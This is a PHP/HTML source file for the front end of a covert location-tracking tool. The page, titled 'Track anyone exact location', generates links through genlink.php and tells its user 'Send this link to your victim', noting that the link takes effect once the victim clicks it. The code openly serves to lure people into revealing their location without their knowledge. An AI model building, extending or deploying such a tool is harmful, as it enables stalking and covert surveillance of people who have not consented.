<?php
/*$cookie_value = "609";
setcookie('userid', $cookie_value, time() + (86400 * 30), "/"); // 86400 = 1 day

if(!isset($_COOKIE['userid'])) {
     echo "Cookie named is not set!";
} else {
     echo "Value is: " . $_COOKIE['userid'];
     echo "Value is: " . $_COOKIE['username'];
}
*/


?>		

<!DOCTYPE html>
<html>
<head>
  <title>Create Link</title>
   <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
</head>
<body>
  <div class="container mt-4">
    <iframe width="560" height="315" src="https://www.youtube.com/embed/a1FURtNNAJo" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    <h2 class="mt-3">Track anyone exact location</h2>
   <button type="button" class="btn btn-success mt-4" onclick="genlink()">Genreate Link</button>
   <P>Send this link to your victim</P>
    <a target="_blank"><p class="mt-4" id="themelink"></p></a>
    <p>This link will valid when victim clicked</p>
  <p id="loclink"> </p> 

  </div>
<script type="text/javascript">
  function genlink(){
   var x;
   var y;
  $.ajax({
      type: 'POST',
      url: 'genlink.php',
      data: {parm1: x, parm2: y},
      success: function(resp){ 
        var obj = JSON.parse(resp);
        var url = window.location.href;
        document.getElementById("themelink").innerText = url + obj.theme1;
        document.getElementById("loclink").innerText = url + obj.getloc;
      },
      mimeType: 'text'
    });
}
</script>
</body>
</html>